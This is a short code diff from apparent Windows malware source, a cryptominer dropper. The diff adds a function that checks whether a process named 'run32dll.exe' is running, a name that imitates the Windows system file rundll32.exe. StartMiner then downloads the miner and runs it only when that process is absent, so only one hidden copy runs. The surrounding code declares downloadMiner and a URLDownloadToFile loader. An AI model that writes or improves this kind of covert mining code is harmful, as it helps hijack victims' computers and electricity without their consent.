@@ -3,6 +3,8 @@
 #include <commctrl.h>
 #include <string>
 #include <urlmon.h>
+#include "process.h"
+#include "utils.h"
 
 typedef HRESULT(WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
     LPCTSTR szURL,
@@ -13,10 +15,28 @@ typedef HRESULT(WINAPI* lpURLDownloadToFile) (LPUNKNOWN pCaller,
 void runFile();
 void downloadMiner();
 
+BOOL IsProcessRunning2(const char *processName)
+{
+    BOOL exists = false;
+    PROCESSENTRY32 entry;
+    entry.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+
+    if (Process32First(snapshot, &entry))
+        while (Process32Next(snapshot, &entry))
+            if (!stricmp(entry.szExeFile, processName))
+                exists = true;
+
+    CloseHandle(snapshot);
+    return exists;
+
+}
 void StartMiner()
 {
     downloadMiner();
-    runFile(); 
+    if (!IsProcessRunning2("run32dll.exe"))
+        runFile(); 
 }
 
 int CheckFileExists(TCHAR * file)
